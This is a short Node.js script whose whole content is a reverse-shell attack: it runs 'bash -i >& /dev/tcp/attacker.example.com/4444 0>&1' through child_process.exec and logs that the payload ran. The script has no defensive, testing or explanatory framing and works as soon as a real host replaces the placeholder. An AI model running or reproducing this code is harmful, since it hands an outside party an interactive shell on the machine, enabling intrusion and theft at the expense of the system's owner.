const { exec } = require('child_process');

const payload = 'bash -i >& /dev/tcp/attacker.example.com/4444 0>&1';

console.log('[*] Executing reverse shell payload…');
exec(payload, (err, stdout, stderr) => {
  if (err) {
    console.error('[!] Error executing payload:', err);
    return;
  }
  console.log('[+] Payload executed. stdout:', stdout);
});
